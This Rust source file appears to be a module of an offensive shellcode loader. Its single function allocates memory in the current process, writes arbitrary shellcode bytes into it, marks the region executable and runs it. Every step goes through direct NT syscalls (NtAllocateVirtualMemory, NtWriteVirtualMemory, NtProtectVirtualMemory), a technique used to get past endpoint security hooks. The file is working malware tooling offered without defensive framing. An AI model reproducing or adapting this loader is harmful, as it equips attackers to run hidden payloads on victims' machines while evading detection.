use rust_syscalls::syscall;
// =======================================================================================================
//
// (DEFAULT) SHELLCODE EXECUTION USING NTWriteVritualMemory
//
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteDefault")]
use windows::Win32::System::Threading::GetCurrentProcess;
#[cfg(feature = "ShellcodeExecuteDefault")]
use windows::Win32::Foundation::HANDLE;
#[cfg(feature = "ShellcodeExecuteDefault")]
use std::ffi::c_void;

#[cfg(feature = "ShellcodeExecuteDefault")]
pub fn shellcode_execute_default(bytes_to_load: Vec<u8>) -> bool
{
    // Use -1 as handle for current process (standard Windows convention)
    let process_handle: HANDLE = HANDLE(-1isize);
    let mut base_address: *mut c_void = std::ptr::null_mut();

    let mut region_size: usize = bytes_to_load.len();
    let allocation_type: u32 = 0x1000;
    let mut return_value: i32;
    let mut bytes_written: usize = 0;
    let mut oldprotect: u32 = 0;
    unsafe
    {
        return_value = syscall!("NtAllocateVirtualMemory", process_handle, &mut base_address, 0, &mut region_size, allocation_type, 0x04);
    }
    if return_value != 0 {
        println!("Failed to allocate memory, NtAllocateVirtualMemory");
        println!("{:x}", return_value);
        return false;
    }
    let shellcode_ptr = bytes_to_load.as_ptr() as *const c_void;
    unsafe
    {
        return_value = syscall!("NtWriteVirtualMemory", process_handle, base_address, shellcode_ptr, bytes_to_load.len(), &mut bytes_written);
    }
    if return_value != 0 {
        println!("Failed to write shellcode, NtWriteVirtualMemory");
        println!("{:x}", return_value);
        return false;
    }
    let mut protectaddress_to_protect: *mut c_void = base_address;
    let mut size_to_set = bytes_to_load.len();
    unsafe
    {
        return_value = syscall!("NtProtectVirtualMemory", process_handle, &mut protectaddress_to_protect, &mut size_to_set, 0x20, &mut oldprotect);
    }
    if return_value != 0 {
        println!("Failed to reprotect memory, NtProtectVirtualMemory");
        println!("{:x}", return_value);
        return false;
    }
    unsafe {
        let function: extern "C" fn() = std::mem::transmute(base_address);
        (function)();
    }
    return true;
}